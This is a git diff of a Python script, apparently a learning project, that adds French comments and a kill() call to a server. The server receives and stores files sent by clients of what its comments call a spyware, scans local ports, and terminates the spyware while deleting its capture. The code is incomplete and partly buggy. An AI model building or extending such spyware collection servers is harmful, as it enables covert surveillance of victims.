@@ -8,23 +8,24 @@ import os
 import CLT
 import subprocess
 
-# Server configuration
+#Server configuration
 SERVER_HOST = '127.0.0.1'
 SERVER_PORT = 55556
 
 BUFFER_SIZE = 1024
 
 
-# Dictionary to store client IDs and connections
+#Dictionary to store client IDs and connections
 CLIENT_FILE_DAY = {}
 
 #Array with all open ports
 PORTS = []
 
 
+#Scanner les ports ouverts sur la machine
 def allOpenPorts():
     open_ports = []
-    for port in range(1, 1025):  # Exemple : Scanner les ports de 1 à 1024
+    for port in range(1, 1025):  #Exemple : Scanner les ports de 1 à 1024
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(1)
         result = sock.connect_ex(('localhost', port))
@@ -33,6 +34,7 @@ def allOpenPorts():
         sock.close()
     return open_ports
 
+#Ecouter sur un port spécifique
 def listenPort(port):
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind(('localhost', port))
@@ -41,6 +43,7 @@ def listenPort(port):
     client_socket, addr = server_socket.accept()
     print(f"Connexion acceptée de {addr}")
 
+#Fermer une connexion sur le port 
 def closePort(port):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -51,29 +54,28 @@ def closePort(port):
     except Exception as e:
         print(f"Erreur lors de la fermeture du port {port}: {e}")
 
-
+#Fermer toutes les connexions sur tous les ports ouverts
 def closeAllPort():
     for port in range(1, 1025):
         closePort(port)
 
-
-
+#Fonction de --kill pour arrêter le serveur 
 def kill():
     try:
-        # Fermer tous les ports sur lesquels le serveur écoute
+        #Fermer tous les ports sur lesquels le serveur écoute
         for process in psutil.process_iter(['pid', 'name']):
             if SERVER_HOST in process.info['name'].lower():  
                 print(f"Arrêt du processus {process.info['pid']}")
                 process.send_signal(psutil.signal.SIGTERM)
         
-        # Arrêter toutes les instances du serveur en cours
+        #Arrêter toutes les instances du serveur en cours
         subprocess.run(['pkill', '-f', SERVER_HOST])
 
-        # Avertir le spyware de s'arrêter
-        subprocess.run(['pkill', '-f', 'spyware_process'])#Remlacer par nom du spyware
+        #Avertir le spyware de s'arrêter
+        subprocess.run(['pkill', '-f', CLT.writeFile])#Remlacer par nom du spyware
 
 
-        # Supprimer la capture
+        #Supprimer la capture
         os.remove(CLT.writeFile())  
         print("Capture supprimée avec succès.")
         
@@ -81,6 +83,7 @@ def kill():
     except Exception as e:
         print(f"Erreur lors de l'arrêt : {e}")
 
+#Fonction d'aide affichant tout les fonctions disponible 
 def help():
     print("Fonctions disponibles :")
     print("- allOpenPorts(): Cette fonction retourne une liste de tous les ports ouverts.")
@@ -89,7 +92,7 @@ def help():
     print("- closeAllPort(): Cette fonction ferme toutes les connexions sur tous les ports ouverts.")
 
 
-
+#Ajouter un fichier à la liste des fichiers d'un client
 def addFileDirectory(IDClient, nameFile):
     global CLIENT_FILE_DAY
     if IDClient in CLIENT_FILE_DAY:
@@ -100,6 +103,9 @@ def addFileDirectory(IDClient, nameFile):
 """
 Display all files sent to SERVER coming from one Client in particular
 """
+
+
+#Afficher les fichiers d'un client particulier
 def displayFileClientDay(IDClient):
     if IDClient in CLIENT_FILE_DAY:
         filesClient = CLIENT_FILE_DAY[IDClient]
@@ -109,7 +115,7 @@ def displayFileClientDay(IDClient):
 
 """"""
 
-#equivalent to '--show'
+#equivalent to '--show' pour afficher tous les fichiers reçus par le serveur
 def displayAllFileDay():
     print("Listing all files received this connection:")
     for IDClient, files in CLIENT_FILE_DAY.items():
@@ -122,18 +128,19 @@ def displayAllFileDay():
 
 
 
-
+#Recevoir un fichier d'un client
 def receiveFile(data):
     print("[*] Receive a file from a client")
 
 
+#Lire les commandes de l'utilisateur
 def inputServer():
     i = input(f"SERVER > (écrire --listen) ")
     if i == "--listen":
         connectClients()
 
 
-
+#Sauvegarder un fichier reçu
 def saveFile(IDClient, fileContent):
     nameFile = "Test_File.txt"
     try:
@@ -144,7 +151,7 @@ def saveFile(IDClient, fileContent):
     except Exception as e:
         print(f"An error occurred saving file : {e}")
 
-
+#Lire le contenu du fichier recu
 def readFile(fileName):
     with open(fileName, 'rb') as f:
         print("+++ BEGINNING +++")
@@ -153,7 +160,7 @@ def readFile(fileName):
         print("+++ END +++\n")
 
 
-
+#Gérer la communication avec un client
 def manageClient(clientSocket, address):
     global CLIENT_FILE_DAY
     print(f"[*] Accepted connection from {address}")
@@ -182,6 +189,7 @@ def manageClient(clientSocket, address):
     print(f"[*] Connection from {IPClient} ({address}) closed.")
 
 
+#Accepter les connexions des clients
 def connectClients():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((SERVER_HOST, SERVER_PORT))
@@ -189,10 +197,10 @@ def connectClients():
         print(f"[*] Listening on {SERVER_HOST}:{SERVER_PORT}..")
 
         while True:
-            # Accept a new connection from client
+            #Accept a new connection from client
             clientSocket, clientAddress = s.accept()
 
-            # Start a new thread to manage client
+            #Start a new thread to manage client
             threadClient = threading.Thread(target=manageClient, args=(clientSocket, clientAddress))
             threadClient.start()
 
@@ -201,6 +209,8 @@ def main():
     #connectClients()
     inputServer()
     help()
+    kill()
+
 
 
 if __name__ == "__main__":
